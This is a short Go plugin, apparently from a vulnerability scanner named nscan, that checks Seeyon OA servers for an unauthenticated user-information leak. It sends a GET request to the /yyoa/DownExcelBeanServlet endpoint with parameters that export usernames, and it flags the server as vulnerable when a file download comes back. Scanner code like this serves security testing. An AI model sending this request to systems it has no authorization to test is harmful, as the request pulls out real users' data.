package seeyon

import (
	"fmt"
	"nscan/plugins/log"
	"nscan/utils"
)

//DownExcelBeanServlet 用户敏感信息泄露

func DownExcelBeanServlet(u string) bool {
	var vuln = false
	if req, err := utils.HttpRequset(u+"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && req.Header.Get("Content-disposition") != "" {
			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln seeyon DownExcelBeanServlet|%s\n", u+"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"))
			vuln = true
		}
	}
	return vuln
}
